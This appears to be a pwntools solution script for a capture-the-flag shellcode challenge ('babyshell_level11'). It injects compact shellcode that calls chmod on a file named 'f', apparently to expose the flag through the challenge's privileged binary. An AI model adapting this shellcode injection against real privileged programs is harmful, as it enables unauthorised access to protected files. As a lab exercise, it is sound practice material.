#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/babyshell_level11
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyshell_level11')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      PIE enabled
# Stack:    Executable
# RWX:      Has RWX segments
# SHSTK:    Enabled
# IBT:      Enabled

io = start()

shellcode = asm("""
push 0x66
mov rdi, rsp
mov esi, 444
mov al, 90
syscall
""")
print(disasm(shellcode))
payload = fit(shellcode)
io.sendline(payload)

io.interactive()

